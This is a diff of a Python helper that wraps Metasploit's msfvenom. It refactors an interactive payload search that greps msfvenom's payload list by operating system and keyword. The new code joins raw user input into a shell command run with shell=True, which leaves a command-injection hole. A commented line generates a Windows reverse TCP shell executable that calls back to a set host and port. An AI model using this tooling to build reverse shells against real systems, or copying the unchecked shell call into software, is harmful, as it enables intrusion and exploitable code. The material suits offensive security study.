@@ -73,6 +73,7 @@ def createPayload():
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   opersystem = OS
+  
 
   #If not command for OS
   operatingSystem = "linux", "windows", "mac"
@@ -85,40 +86,26 @@ def createPayload():
    opersystem = OS
   
   #Adds OS to search
-  packetSearch = (str(baseSearch) + " |" + " grep " + str(OS) + " |")
+  packetSearch = (str(baseSearch) + " | " + "grep" + str(OS))
   packetFinal = ""
+  grep = " | grep "
+  grepfinal = " | grep " + opersystem  
 
   while packetCreation >= 1:
     os.system('cls' if os.name == 'nt' else "printf '\033c'")
-
-    #Grep Question 2/...
+    #Grep Question 2
     print(Fore.RED + "   Question 2: Are there any certain keys you wish to grep for? ")
     print("   Examples: reverse, x86, windows")
     print("   Note: If nothing else just press enter")
     print()
     OS = input(Fore.WHITE + "Command Line: ")
-
-    global test
+    if OS != "":
+      grepfinal += grep + OS
     if OS == "":
-      packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
       packetCreation = 0
 
-    if packetCreation == 1:
-      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
-      key = OS
-      test = "1"
-      packetCreation += 1
-    elif packetCreation == 2:
-      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
-      twokey = OS
-      test = "2"                                                                                                                                          
-      packetCreation += 1
-    elif packetCreation == 3:
-      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
-      threekey = OS
-      test = "3"
-      packetCreation += 1
-    
+  grepfinal += " | grep -iv meterpreter"
+  grepfinal += " | grep -v staged"
   
   arge_zero = "|"
   arge_one = "grep"
@@ -128,35 +115,17 @@ def createPayload():
   arge_five = "staged" 
   program_call1 = "-l"
   program_call2 = "payloads"
-  
-  global finalPacket                                                              
+                                                           
   #Packages should be here after the end
-  if test == "0":
-    os.system('cls' if os.name == 'nt' else "printf '\033c'")
-    print(Fore.RED + "Payload Search:")
-    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
-    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
-    print(Fore.GREEN)
-    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
 
-  if test == "1":
-    os.system('cls' if os.name == 'nt' else "printf '\033c'")
-    print(Fore.RED + "Payload Search:")
-    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
-    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
-    print(Fore.GREEN)
-    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
-    
-  
-  if test == "2":
-    os.system('cls' if os.name == 'nt' else "printf '\033c'")
-    print(Fore.RED + "Payload Search:")
-    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
-    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
-    print(Fore.GREEN)
-    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
-
-  
+  os.system('cls' if os.name == 'nt' else "printf '\033c'")
+  print(Fore.RED + "Payload Search:")
+  print("   Targeted Search: " + baseSearch + grepfinal)
+  print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
+  cmd = baseSearch + grepfinal
+  print(Fore.GREEN + "")
+  return_code = subprocess.call(cmd, shell=True)
+  print(return_code)
   print()
   global arg_two
   arg_two = input(Fore.WHITE + "Command Line: ")
@@ -270,3 +239,4 @@ return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg
 print("output:", return_code)
 # # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
 # # print("output:", return_code)
+
